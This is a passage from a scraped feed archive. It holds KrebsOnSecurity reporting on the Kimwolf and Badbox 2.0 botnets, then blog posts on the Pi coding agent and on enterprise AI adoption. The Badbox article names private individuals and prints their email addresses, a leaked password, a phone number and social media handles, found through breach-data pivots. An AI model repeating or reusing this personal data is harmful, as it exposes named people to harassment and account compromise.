unable to find reliable \u201cbulletproof\u201d hosting for their botnet. \\n Hilariously, a user by the name \u201cRichard Remington\u201d briefly appeared in the group\u2019s Telegram server to post a crude \u201cHappy New Year\u201d sketch that claims Dort and Snow are now in control of 3.5 million devices infected by Aisuru and/or Kimwolf. Richard Remington\u2019s Telegram account has since been deleted, but it previously stated its owner operates a website that caters to DDoS-for-hire or \u201cstresser\u201d services seeking to test their firepower. \\n \\n BYTECONNECT, PLAINPROXIES, AND 3XK TECH \\n Reports from both Synthient and XLab found that Kimwolf was used to deploy programs that turned infected systems into Internet traffic relays for multiple residential proxy services. Among those was a component that installed a software development kit (SDK) called ByteConnect, which is distributed by a provider known as Plainproxies . \\n ByteConnect says it specializes in \u201cmonetizing apps ethically and free,\u201d while Plainproxies advertises the ability to provide content scraping companies with \u201cunlimited\u201d proxy pools. However, Synthient said that upon connecting to ByteConnect\u2019s SDK they instead observed a mass influx of credential-stuffing attacks targeting email servers and popular online websites. \\n A search on LinkedIn finds the CEO of Plainproxies is Friedrich Kraft , whose resume says he is co-founder of ByteConnect Ltd. Public Internet routing records show Mr. Kraft also operates a hosting firm in Germany called 3XK Tech GmbH . Mr. Kraft did not respond to repeated requests for an interview. \\n In July 2025, Cloudflare reported that 3XK Tech (a.k.a. Drei-K-Tech) had become the Internet\u2019s largest source of application-layer DDoS attacks . In November 2025, the security firm GreyNoise Intelligence found that Internet addresses on 3XK Tech were responsible for roughly three-quarters of the Internet scanning being done at the time for a newly discovered and critical vulnerability in security products made by Palo Alto Networks. \\n Source: Cloudflare\u2019s Q2 2025 DDoS threat report. \\n LinkedIn has a profile for another Plainproxies employee, Julia Levi , who is listed as co-founder of ByteConnect. Ms. Levi did not respond to requests for comment. Her resume says she previously worked for two major proxy providers: Netnut Proxy Network, and Bright Data. \\n Synthient likewise said Plainproxies ignored their outreach, noting that the Byteconnect SDK continues to remain active on devices compromised by Kimwolf. \\n A post from the LinkedIn page of Plainproxies Chief Revenue Officer Julia Levi, explaining how the residential proxy business works. \\n MASKIFY \\n Synthient\u2019s January 2 report said another proxy provider heavily involved in the sale of Kimwolf proxies was Maskify , which currently advertises on multiple cybercrime forums that it has more than six million residential Internet addresses for rent. \\n Maskify prices its service at a rate of 30 cents per gigabyte of data relayed through their proxies. According to Synthient, that price range is insanely low and is far cheaper than any other proxy provider in business today. \\n \u201cSynthient\u2019s Research Team received screenshots from other proxy providers showing key Kimwolf actors attempting to offload proxy bandwidth in exchange for upfront cash,\u201d the Synthient report noted. \u201cThis approach likely helped fuel early development, with associated members spending earnings on infrastructure and outsourced development tasks. Please note that resellers know precisely what they are selling; proxies at these prices are not ethically sourced.\u201d \\n Maskify did not respond to requests for comment. \\n The Maskify website. Image: Synthient. \\n BOTMASTERS LASH OUT \\n Hours after our first Kimwolf story was published last week, the resi[.]to Discord server vanished, Synthient\u2019s website was hit with a DDoS attack, and the Kimwolf botmasters took to doxing Brundage via their botnet. \\n The harassing messages appeared as text records uploaded to the Ethereum Name Service (ENS), a distributed system for supporting smart contracts deployed on the Ethereum blockchain. As documented by XLab, in mid-December the Kimwolf operators upgraded their infrastructure and began using ENS to better withstand the near-constant takedown efforts targeting the botnet\u2019s control servers. \\n An ENS record used by the Kimwolf operators taunts security firms trying to take down the botnet\u2019s control servers. Image: XLab. \\n By telling infected systems to seek out the Kimwolf control servers via ENS, even if the servers that the botmasters use to control the botnet are taken down the attacker only needs to update the ENS text record to reflect the new Internet address of the control server, and the infected devices will immediately know where to look for further instructions. \\n \u201cThis channel itself relies on the decentralized nature of blockchain, unregulated by Ethereum or other blockchain operators, and cannot be blocked,\u201d XLab wrote. \\n The text records included in Kimwolf\u2019s ENS instructions can also feature short messages, such as those that carried Brundage\u2019s personal information. Other ENS text records associated with Kimwolf offered some sage advice: \u201cIf flagged, we encourage the TV box to be destroyed.\u201d \\n An ENS record tied to the Kimwolf botnet advises, \u201cIf flagged, we encourage the TV box to be destroyed.\u201d \\n Both Synthient and XLabs say Kimwolf targets a vast number of Android TV streaming box models, all of which have zero security protections, and many of which ship with proxy malware built in. Generally speaking, if you can send a data packet to one of these devices you can also seize administrative control over it. \\n If you own a TV box that matches one of these model names and/or numbers , please just rip it out of your network. If you encounter one of these devices on the network of a family member or friend, send them a link to this story (or to our January 2 story on Kimwolf ) and explain that it\u2019s not worth the potential hassle and harm created by keeping them plugged in. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:06</p>"},{"location":"krebsonsecurity.com/Who%20Operates%20the%20Badbox%202.0%20Botnet-_20260126/","title":"Who Operates the Badbox 2.0 Botnet?","text":"<p>\u6765\u6e90: krebsonsecurity.com \u53d1\u5e03\u65f6\u95f4: Mon, 26 Jan 2026 16:11:38 +0000 \u94fe\u63a5: https://krebsonsecurity.com/2026/01/who-operates-the-badbox-2-0-botnet/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' The cybercriminals in control of Kimwolf \u2014 a disruptive botnet that has infected more than 2 million devices \u2014 recently shared a screenshot indicating they\u2019d compromised the control panel for Badbox 2.0 , a vast China-based botnet powered by malicious software that comes pre-installed on many Android TV streaming boxes. Both the FBI and Google say they are hunting for the people behind Badbox 2.0, and thanks to bragging by the Kimwolf botmasters we may now have a much clearer idea about that. \\n Our first story of 2026, The Kimwolf Botnet is Stalking Your Local Network , detailed the unique and highly invasive methods Kimwolf uses to spread. The story warned that the vast majority of Kimwolf infected systems were unofficial Android TV boxes that are typically marketed as a way to watch unlimited (pirated) movie and TV streaming services for a one-time fee. \\n Our January 8 story, Who Benefitted from the Aisuru and Kimwolf Botnets? , cited multiple sources saying the current administrators of Kimwolf went by the nicknames \u201c Dort \u201d and \u201c Snow .\u201d Earlier this month, a close former associate of Dort and Snow shared what they said was a screenshot the Kimwolf botmasters had taken while logged in to the Badbox 2.0 botnet control panel. \\n That screenshot, a portion of which is shown below, shows seven authorized users of the control panel, including one that doesn\u2019t quite match the others: According to my source, the account \u201c ABCD \u201d (the one that is logged in and listed in the top right of the screenshot) belongs to Dort, who somehow figured out how to add their email address as a valid user of the Badbox 2.0 botnet. \\n The control panel for the Badbox 2.0 botnet lists seven authorized users and their email addresses. Click to enlarge. \\n Badbox has a storied history that well predates Kimwolf\u2019s rise in October 2025. In July 2025, Google filed a \u201cJohn Doe\u201d lawsuit (PDF) against 25 unidentified defendants accused of operating Badbox 2.0, which Google described as a botnet of over ten million unsanctioned Android streaming devices engaged in advertising fraud. Google said Badbox 2.0, in addition to compromising multiple types of devices prior to purchase, also can infect devices by requiring the download of malicious apps from unofficial marketplaces. \\n Google\u2019s lawsuit came on the heels of a\\xa0 June 2025 advisory \\xa0from the\\xa0 Federal Bureau of Investigation \\xa0(FBI), which warned that cyber criminals were gaining unauthorized access to home networks by either configuring the products with malware prior to the user\u2019s purchase, or infecting the device as it downloads required applications that contain backdoors \u2014 usually during the set-up process. \\n The FBI said Badbox 2.0 was discovered after the original Badbox campaign was disrupted in 2024. The original Badbox was identified in 2023, and primarily consisted of Android operating system devices (TV boxes) that were compromised with backdoor malware prior to purchase. \\n KrebsOnSecurity was initially skeptical of the claim that the Kimwolf botmasters had hacked the Badbox 2.0 botnet. That is, until we began digging into the history of the qq.com email addresses in the screenshot above. \\n CATHEAD \\n An online search for the address 34557257@qq.com (pictured in the screenshot above as the user \u201c Chen \u201c) shows it is listed as a point of contact for a number of China-based technology companies, including: \\n \u2013 Beijing Hong Dake Wang Science &amp; Technology Co Ltd. \\n\u2013 Beijing Hengchuang Vision Mobile Media Technology Co. Ltd. \\n\u2013 Moxin Beijing Science and Technology Co. Ltd. \\n The website for Beijing Hong Dake Wang Science is asmeisvip[.]net , a domain that was flagged in a March 2025 report by HUMAN Security as one of several dozen sites tied to the distribution and management of the Badbox 2.0 botnet. Ditto for moyix[.]com , a domain associated with Beijing Hengchuang Vision Mobile. \\n A search at the breach tracking service Constella Intelligence finds 34557257@qq.com at one point used the password \u201c cdh76111 .\u201d Pivoting on that password in Constella shows it is known to have been used by just two other email accounts: daihaic@gmail.com and cathead@gmail.com . \\n Constella found cathead@gmail.com registered an account at jd.com (China\u2019s largest online retailer) in 2021 under the name \u201c\u9648\u4ee3\u6d77,\u201d which translates to \u201c Chen Daihai .\u201d According to DomainTools.com , the name Chen Daihai is present in the original registration records (2008) for moyix[.]com, along with the email address cathead@astrolink[.]cn . \\n Incidentally, astrolink[.]cn also is among the Badbox 2.0 domains identified in HUMAN Security\u2019s 2025 report . DomainTools finds cathead@astrolink[.]cn was used to register more than a dozen domains, including vmud[.]net , yet another Badbox 2.0 domain tagged by HUMAN Security. \\n XAVIER \\n A cached copy of astrolink[.]cn preserved at archive.org shows the website belongs to a mobile app development company whose full name is Beijing Astrolink Wireless Digital Technology Co. Ltd . The archived website reveals a \u201cContact Us\u201d page that lists a Chen Daihai as part of the company\u2019s technology department. The other person featured on that contact page is Zhu Zhiyu , and their email address is listed as xavier@astrolink[.]cn . \\n A Google-translated version of Astrolink\u2019s website, circa 2009. Image: archive.org. \\n Astute readers will notice that the user Mr.Zhu in the Badbox 2.0 panel used the email address xavierzhu@qq.com . Searching this address in Constella reveals a jd.com account registered in the name of Zhu Zhiyu. A rather unique password used by this account matches the password used by the address xavierzhu@gmail.com , which DomainTools finds was the original registrant of astrolink[.]cn. \\n ADMIN \\n The very first account listed in the Badbox 2.0 panel \u2014 \u201cadmin,\u201d registered in November 2020 \u2014 used the email address 189308024@qq.com . DomainTools shows this email is found in the 2022 registration records for the domain guilincloud[.]cn , which includes the registrant name \u201c Huang Guilin .\u201d \\n Constella finds 189308024@qq.com is associated with the China phone number 18681627767 . The open-source intelligence platform osint.industries reveals this phone number is connected to a Microsoft profile created in 2014 under the name Guilin Huang (\u6842\u6797 \u9ec4) . The cyber intelligence platform Spycloud says that phone number was used in 2017 to create an account at the Chinese social media platform Weibo under the username \u201c h_guilin .\u201d \\n The public information attached to Guilin Huang\u2019s Microsoft account, according to the breach tracking service osintindustries.com. \\n The remaining three users and corresponding qq.com email addresses were all connected to individuals in China. However, none of them (nor Mr. Huang) had any apparent connection to the entities created and operated by Chen Daihai and Zhu Zhiyu \u2014 or to any corporate entities for that matter. Also, none of these individuals responded to requests for comment. \\n The mind map below includes search pivots on the email addresses, company names and phone numbers that suggest a connection between Chen Daihai, Zhu Zhiyu, and Badbox 2.0. \\n This mind map includes search pivots on the email addresses, company names and phone numbers that appear to connect Chen Daihai and Zhu Zhiyu to Badbox 2.0. Click to enlarge. \\n UNAUTHORIZED ACCESS \\n The idea that the Kimwolf botmasters could have direct access to the Badbox 2.0 botnet is a big deal, but explaining exactly why that is requires some background on how Kimwolf spreads to new devices. The botmasters figured out they could trick residential proxy services into relaying malicious commands to vulnerable devices behind the firewall on the unsuspecting user\u2019s local network. \\n The vulnerable systems sought out by Kimwolf are primarily Internet of Things (IoT) devices like unsanctioned Android TV boxes and digital photo frames that have no discernible security or authentication built-in. Put simply, if you can communicate with these devices, you can compromise them with a single command. \\n Our January 2 story featured research from the proxy-tracking firm Synthient , which alerted 11 different residential proxy providers that their proxy endpoints were vulnerable to being abused for this kind of local network probing and exploitation. \\n Most of those vulnerable proxy providers have since taken steps to prevent customers from going upstream into the local networks of residential proxy endpoints, and it appeared that Kimwolf would no longer be able to quickly spread to millions of devices simply by exploiting some residential proxy provider. \\n However, the source of that Badbox 2.0 screenshot said the Kimwolf botmasters had an ace up their sleeve the whole time: Secret access to the Badbox 2.0 botnet control panel. \\n \u201cDort has gotten unauthorized access,\u201d the source said. \u201cSo, what happened is normal proxy providers patched this. But Badbox doesn\u2019t sell proxies by itself, so it\u2019s not patched. And as long as Dort has access to Badbox, they would be able to load\u201d the Kimwolf malware directly onto TV boxes associated with Badbox 2.0. \\n The source said it isn\u2019t clear how Dort gained access to the Badbox botnet panel. But it\u2019s unlikely that Dort\u2019s existing account will persist for much longer: All of our notifications to the qq.com email addresses listed in the control panel screenshot received a copy of that image, as well as questions about the apparently rogue ABCD account. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:57:01</p>"},{"location":"lcamtuf.substack.com/","title":"lcamtuf.substack.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"lcamtuf.substack.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"lcamtuf.substack.com/#1-you-gotta-think-outside-the-hypercube","title":"1. You gotta think outside the hypercube","text":"<p>\u94fe\u63a5: https://lcamtuf.substack.com/p/you-gotta-think-outside-the-hypercube</p> <p>\u65e5\u671f: Mon, 26 Jan 2026 23:05:38 GMT</p> <p>\u6458\u8981: A closer look at the tesseract and the ways we can render it on the screen.</p>"},{"location":"lcamtuf.substack.com/#2-the-toil-of-blog-art","title":"2. The toil of (blog) art","text":"<p>\u94fe\u63a5: https://lcamtuf.substack.com/p/the-toil-of-blog-art</p> <p>\u65e5\u671f: Sun, 18 Jan 2026 18:17:01 GMT</p> <p>\u6458\u8981: An image is worth $19.95.</p>"},{"location":"lcamtuf.substack.com/#3-see-it-with-your-lying-ears","title":"3. See it with your lying ears","text":"<p>\u94fe\u63a5: https://lcamtuf.substack.com/p/see-it-with-your-lying-ears</p> <p>\u65e5\u671f: Sat, 10 Jan 2026 00:00:05 GMT</p> <p>\u6458\u8981: This blog has a history of answering questions that no one should be asking. Today, we continue that proud legacy.</p>"},{"location":"lcamtuf.substack.com/#4-cursed-circuits-4-pll-frequency-multiplier","title":"4. Cursed circuits #4: PLL frequency multiplier","text":"<p>\u94fe\u63a5: https://lcamtuf.substack.com/p/cursed-circuits-4-pll-frequency-multiplier</p> <p>\u65e5\u671f: Fri, 26 Dec 2025 17:47:58 GMT</p> <p>\u6458\u8981: How do you turn 1 MHz into 100 MHz? With magic, of course.</p>"},{"location":"lcamtuf.substack.com/#5-cursed-circuits-3-true-mathematics","title":"5. Cursed circuits #3: true mathematics","text":"<p>\u94fe\u63a5: https://lcamtuf.substack.com/p/cursed-circuits-3-true-mathematics</p> <p>\u65e5\u671f: Mon, 22 Dec 2025 02:38:09 GMT</p> <p>\u6458\u8981: Op-amp arithmetics, explained in a more accessible way</p>"},{"location":"lcamtuf.substack.com/01_You_gotta_think_outside_the_hypercube/","title":"You gotta think outside the hypercube","text":"<p>\u539f\u6587\u94fe\u63a5: https://lcamtuf.substack.com/p/you-gotta-think-outside-the-hypercube \u53d1\u5e03\u65e5\u671f: Mon, 26 Jan 2026 23:05:38 GMT</p> <p>A closer look at the tesseract and the ways we can render it on the screen.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"lcamtuf.substack.com/02_The_toil_of__blog__art/","title":"The toil of (blog) art","text":"<p>\u539f\u6587\u94fe\u63a5: https://lcamtuf.substack.com/p/the-toil-of-blog-art \u53d1\u5e03\u65e5\u671f: Sun, 18 Jan 2026 18:17:01 GMT</p> <p>An image is worth $19.95.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"lcamtuf.substack.com/03_See_it_with_your_lying_ears/","title":"See it with your lying ears","text":"<p>\u539f\u6587\u94fe\u63a5: https://lcamtuf.substack.com/p/see-it-with-your-lying-ears \u53d1\u5e03\u65e5\u671f: Sat, 10 Jan 2026 00:00:05 GMT</p> <p>This blog has a history of answering questions that no one should be asking. Today, we continue that proud legacy.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"lcamtuf.substack.com/04_Cursed_circuits__4__PLL_frequency_multiplier/","title":"Cursed circuits #4: PLL frequency multiplier","text":"<p>\u539f\u6587\u94fe\u63a5: https://lcamtuf.substack.com/p/cursed-circuits-4-pll-frequency-multiplier \u53d1\u5e03\u65e5\u671f: Fri, 26 Dec 2025 17:47:58 GMT</p> <p>How do you turn 1 MHz into 100 MHz? With magic, of course.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"lcamtuf.substack.com/05_Cursed_circuits__3__true_mathematics/","title":"Cursed circuits #3: true mathematics","text":"<p>\u539f\u6587\u94fe\u63a5: https://lcamtuf.substack.com/p/cursed-circuits-3-true-mathematics \u53d1\u5e03\u65e5\u671f: Mon, 22 Dec 2025 02:38:09 GMT</p> <p>Op-amp arithmetics, explained in a more accessible way</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"lucumr.pocoo.org/","title":"lucumr.pocoo.org","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Pi- The Minimal Agent Within OpenClaw 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"lucumr.pocoo.org/Pi-%20The%20Minimal%20Agent%20Within%20OpenClaw_20260131/","title":"Pi: The Minimal Agent Within OpenClaw","text":"<p>\u6765\u6e90: lucumr.pocoo.org \u53d1\u5e03\u65f6\u95f4: 2026-01-31T00:00:00+00:00 \u94fe\u63a5: https://lucumr.pocoo.org/2026/1/31/pi/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://lucumr.pocoo.org/feed.atom', 'value': '<p>If you haven\u2019t been living under a rock, you will have noticed this week that a\\nproject of my friend Peter went viral on the\\ninternet.  It went by many names. The\\nmost recent one is OpenClaw but in the news you might\\nhave encountered it as ClawdBot or MoltBot depending on when you read about it.\\nIt is an agent connected to a communication channel of your choice that just\\nruns code.</p>\\n<p>What you might be less familiar with is that what\u2019s under the hood of OpenClaw\\nis a little coding agent called Pi. And\\nPi happens to be, at this point, the coding agent that I use almost exclusively.\\nOver the last few weeks I became more and more of a shill for the little agent.\\nAfter I gave a talk on this recently, I realized that I did not actually write\\nabout Pi on this blog yet, so I feel like I might want to give some context on\\nwhy I\u2019m obsessed with it, and how it relates to OpenClaw.</p>\\n<p>Pi is written by Mario Zechner and unlike Peter, who\\naims for \u201csci-fi with a touch of madness,\u201d <sup>1</sup> Mario is very grounded.  Despite\\nthe differences in approach, both OpenClaw and Pi follow the same idea: LLMs are\\nreally good at writing and running code, so embrace this.  In some ways I think\\nthat\u2019s not an accident because Peter got me and Mario hooked on this idea, and\\nagents last year.</p>\\nWhat is Pi?\\n<p>So Pi is a coding agent.  And there are many coding agents.  Really, I think you\\ncan pick effectively anyone off the shelf at this point and you will be able to\\nexperience what it\u2019s like to do agentic programming.  In reviews on this blog\\nI\u2019ve positively talked about AMP and one of the reasons I resonated so much with\\nAMP is that it really felt like it was a product built by people who got both\\naddicted to agentic programming but also had tried a few different things to see\\nwhich ones work and not just to build a fancy UI around it.</p>\\n<p>Pi is interesting to me because of two main reasons:</p>\\n<ul>\\n<li>First of all, it has a tiny core. It has the shortest system prompt of any\\nagent that I\u2019m aware of and it only has four tools: Read, Write, Edit, Bash. </li>\\n<li>The second thing is that it makes up for its tiny core by providing an\\nextension system that also allows extensions to persist state into sessions,\\nwhich is incredibly powerful. </li>\\n</ul>\\n<p>And a little bonus: Pi itself is written like excellent software. It doesn\u2019t\\nflicker, it doesn\u2019t consume a lot of memory, it doesn\u2019t randomly break, it is\\nvery reliable and it is written by someone who takes great care of what goes\\ninto the software.</p>\\n<p>Pi also is a collection of little components that you can build your own agent\\non top.  That\u2019s how OpenClaw is built, and that\u2019s also how I built my own little\\nTelegram bot and how Mario built his\\nmom.  If you want\\nto build your own agent, connected to something, Pi when pointed to itself and\\nmom, will conjure one up for you.</p>\\nWhat\u2019s Not In Pi\\n<p>And in order to understand what\u2019s in Pi, it\u2019s even more important to understand\\nwhat\u2019s not in Pi, why it\u2019s not in Pi and more importantly: why it won\u2019t be in\\nPi.  The most obvious omission is support for MCP.  There is no MCP support in\\nit. While you could build an extension for it, you can also do what OpenClaw\\ndoes to support MCP which is to use\\nmcporter. mcporter exposes MCP calls via\\na CLI interface or TypeScript bindings and maybe your agent can do something\\nwith it.  Or not, I don\u2019t know :)</p>\\n<p>And this is not a lazy omission.  This is from the philosophy of how Pi works.\\nPi\u2019s entire idea is that if you want the agent to do something that it doesn\u2019t\\ndo yet, you don\u2019t go and download an extension or a skill or something like\\nthis. You ask the agent to extend itself.  It celebrates the idea of code\\nwriting and running code.</p>\\n<p>That\u2019s not to say that you cannot download extensions.  It is very much\\nsupported. But instead of necessarily encouraging you to download someone else\u2019s\\nextension, you can also point your agent to an already existing extension, say\\nlike, build it like the thing you see over there, but make these changes to it\\nthat you like.</p>\\nAgents Built for Agents Building Agents\\n<p>When you look at what Pi and by extension OpenClaw are doing, there is an\\nexample of software that is malleable like clay.  And this sets certain\\nrequirements for the underlying architecture of it that are actually in many\\nways setting certain constraints on the system that really need to go into the\\ncore design.</p>\\n<p>So for instance, Pi\u2019s underlying AI SDK is written so that a session can really\\ncontain many different messages from many different model providers. It\\nrecognizes that the portability of sessions is somewhat limited between model\\nproviders and so it doesn\u2019t lean in too much into any model-provider-specific\\nfeature set that cannot be transferred to another.</p>\\n<p>The second is that in addition to the model messages it maintains custom\\nmessages in the session files which can be used by extensions to store state or\\nby the system itself to maintain information that either not at all is sent to\\nthe AI or only parts of it.</p>\\n<p>Because this system exists and extension state can also be persisted to disk, it\\nhas built-in hot reloading so that the agent can write code, reload, test it and\\ngo in a loop until your extension actually is functional.  It also ships with\\ndocumentation and examples that the agent itself can use to extend itself.  Even\\nbetter: sessions in Pi are trees.  You can branch and navigate within a session\\nwhich opens up all kinds of interesting opportunities such as enabling workflows\\nfor making a side-quest to fix a broken agent tool without wasting context in\\nthe main session.  After the tool is fixed, I can rewind the session back to\\nearlier and Pi summarizes what has happened on the other branch.</p>\\n<p>This all matters because for instance if you consider how MCP works, on most\\nmodel providers, tools for MCP, like any tool for the LLM, need to be loaded\\ninto the system context or the tool section thereof on session start.  That\\nmakes it very hard to impossible to fully reload what tools can do without\\ntrashing the complete cache or confusing the AI about how prior invocations work\\ndifferently.</p>\\nTools Outside The Context\\n<p>An extension in Pi can register a tool to be available to the LLM to call and\\nevery once in a while I find this useful. For instance, despite my criticism of\\nhow Beads is implemented, I do think that giving an agent access to a to-do list\\nis a very useful thing. And I do use an agent-specific issue tracker that works\\nlocally that I had my agent build itself. And because I wanted the agent to also\\nmanage to-dos, in this particular case I decided to give it a tool rather than a\\nCLI.  It felt appropriate for the scope of the problem and it is currently the\\nonly additional tool that I\u2019m loading into my context.</p>\\n<p>But for the most part all of what I\u2019m adding to my agent are either skills or\\nTUI extensions to make working with the agent more enjoyable for me.  Beyond\\nslash commands, Pi extensions can render custom TUI components directly in the\\nterminal: spinners, progress bars, interactive file pickers, data tables,\\npreview panes.  The TUI is flexible enough that Mario proved you can run Doom\\nin it.  Not practical,\\nbut if you can run Doom, you can certainly build a useful dashboard or debugging\\ninterface.</p>\\n<p>I want to highlight some of my extensions to give you an idea of what\u2019s\\npossible.  While you can use them unmodified, the whole idea really is that you\\npoint your agent to one and remix it to your heart\u2019s content.</p>\\n<code>/answer</code>\\n<p>I don\u2019t use plan mode.  I encourage the agent\\nto ask questions and there\u2019s a productive back and forth.  But I don\u2019t like\\nstructured question dialogs that happen if you give the agent a question tool.\\nI prefer the agent\u2019s natural prose with explanations and diagrams interspersed.</p>\\n<p>The problem: answering questions inline gets messy.  So <code>/answer</code> reads the\\nagent\u2019s last response, extracts all the questions, and reformats them into a\\nnice input box.</p>\\n\\n<code>/todos</code>\\n<p>Even though I criticize Beads for its\\nimplementation, giving an agent a to-do list is genuinely useful.  The <code>/todos</code>\\ncommand brings up all items stored in <code>.pi/todos</code> as markdown files.  Both the\\nagent and I can manipulate them, and sessions can claim tasks to mark them as in\\nprogress.</p>\\n\\n<code>/review</code>\\n<p>As more code is written by agents, it makes little sense to throw unfinished\\nwork at humans before an agent has reviewed it first.  Because Pi sessions are\\ntrees, I can branch into a fresh review context, get findings, then bring fixes\\nback to the main session.</p>\\n\\n<p>The UI is modeled after Codex which provides easy to review commits, diffs,\\nuncommitted changes, or remote PRs.  The prompt pays attention to things I care\\nabout so I get the call-outs I want (eg: I ask it to call out newly added\\ndependencies.)</p>\\n<code>/control</code>\\n<p>An extension I experiment with but don\u2019t actively use.  It lets one Pi agent send\\nprompts to another.  It is a simple multi-agent system without complex\\norchestration which is useful for experimentation.</p>\\n<code>/files</code>\\n<p>Lists all files changed or referenced in the session.  You can reveal them in\\nFinder, diff in VS Code, quick-look them, or reference them in your prompt.\\n<code>shift+ctrl+r</code> quick-looks the most recently mentioned file which is handy when\\nthe agent produces a PDF.</p>\\n<p>Others have built extensions too: Nico\u2019s subagent\\nextension and\\ninteractive-shell which\\nlets Pi autonomously run interactive CLIs in an observable TUI overlay.</p>\\nSoftware Building Software\\n<p>These are all just ideas of what you can do with your agent.  The point of it\\nmostly is that none of this was written by me, it was created by the agent to my\\nspecifications.  I told Pi to make an extension and it did.  There is no MCP, there are\\nno community skills, nothing.  Don\u2019t get me wrong, I use tons of skills.  But\\nthey are hand-crafted by my clanker and not downloaded from anywhere.  For\\ninstance I fully replaced all my CLIs or MCPs for browser automation with a\\nskill that just uses\\nCDP.\\nNot because the alternatives don\u2019t work, or are bad, but because this is just\\neasy and natural.  The agent maintains its own functionality.</p>\\n<p>My agent has quite a few\\nskills and crucially\\nI throw skills away if I don\u2019t need them.  I for instance gave it a skill to\\nread Pi sessions that other engineers shared, which helps with code review.  Or\\nI have a skill to help the agent craft the commit messages and commit behavior I\\nwant, and how to update changelogs.  These were originally slash commands, but\\nI\u2019m currently migrating them to skills to see if this works equally well.  I\\nalso have a skill that hopefully helps Pi use <code>uv</code> rather than <code>pip</code>, but I also\\nadded a custom extension to intercept calls to <code>pip</code> and <code>python</code> to redirect\\nthem to <code>uv</code> instead.</p>\\n<p>Part of the fascination that working with a minimal agent like Pi gave me is\\nthat it makes you live that idea of using software that builds more software.\\nThat taken to the extreme is when you remove the UI and output and connect it\\nto your chat.  That\u2019s what OpenClaw does and given its tremendous growth,\\nI really feel more and more that this is going to become our future in one\\nway or another.</p>\\n\\n<ol>\\n<li>\\n<p>https://x.com/steipete/status/2017313990548865292\u21a9</p></li>\\n</ol>\\n'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"martinalderson.com/","title":"martinalderson.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Two kinds of AI users are emerging. The gap between them is astonishing. 20260201</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"martinalderson.com/Two%20kinds%20of%20AI%20users%20are%20emerging.%20The%20gap%20between%20them%20is%20astonishing._20260201/","title":"Two kinds of AI users are emerging. The gap between them is astonishing.","text":"<p>\u6765\u6e90: martinalderson.com \u53d1\u5e03\u65f6\u95f4: Sun, 01 Feb 2026 00:00:00 GMT \u94fe\u63a5: https://martinalderson.com/posts/two-kinds-of-ai-users-are-emerging/?utm_source=rss</p> <p>It still shocks me how much difference there is between AI users. I think it explains a lot about the often confusing (to me) coverage in the media about AI and its productivity impact. I think it's clear there are two types of users to me now, and by extension, the organisations they work for. First, you have the \"power users\", who are all in on adopting new AI technology - Claude Code, MCPs, skills, etc. Surprisingly, these people are often not very technical . I've seen far more non-technical people than I'd expect using Claude Code in terminal, using it for dozens of non-SWE tasks. Finance roles seem to be getting enormous value out of it (unsurprisingly, as Excel on the finance side is remarkably limiting when you start getting used to the power of a full programming ecosystem like Python). Secondly, you have the people who are generally only chatting to ChatGPT or similar. So many people I wouldn't expect are still in this camp. M365 Copilot has a lot to answer for One extremely jarring realisation was just how poor Microsoft Copilot is. It has enormous market share in enterprise as it is bundled in with various Office 365 subscriptions, yet feels like a poorly cloned version of the (already not great) ChatGPT interface. The \"agent\" feature is absolutely laughable compared to what a CLI coding agent (including Microsoft's own GitHub confusingly-named-Copilot CLI). To really underline this, Microsoft itself is rolling out Claude Code to internal teams [1] , despite (obviously) having access to Copilot at near zero cost, and significant ownership of OpenAI. I think this sums up quite how far behind they are The problem is that in enterprise Copilot is often the only allowed AI tool, so that's all you can use without either potentially losing your job or spending a lot of effort trying to procure and use another AI tool. It's slow, the code execution tool in it doesn't work properly and fails horribly with large(ish) files, seemingly due to very very aggressive memory and CPU limitations. This is becoming an existential risk for many enterprises. Senior decision makers are no doubt using these tools with such poor results and are therefore writing off AI, and/or spending a fortune with various large consulting and management consultancy outfits to get not very far. Why enterprise is so at risk Enterprise corporate IT policy results in a completely disastrous combination of limitations that basically ensure that people cannot successfully use more 'cutting edge' AI tooling. Firstly, they tend to have extremely locked down environments, with no ability to run even a basic script interpreter locally (VBA if you are lucky, but even that may be limited by various Group Policies). Secondly, they're locked into legacy software with no real \"internal facing\" APIs on their core workflows, which means agents have nothing to connect to even if you could run them. Finally, they tend to have extremely siloed engineering departments (which may be completely outsourced), so there's nobody internally who could build the infrastructure to run safely sandboxed agents even if they wanted to. The security concerns are real. You definitely do not want people YOLOing coding agents 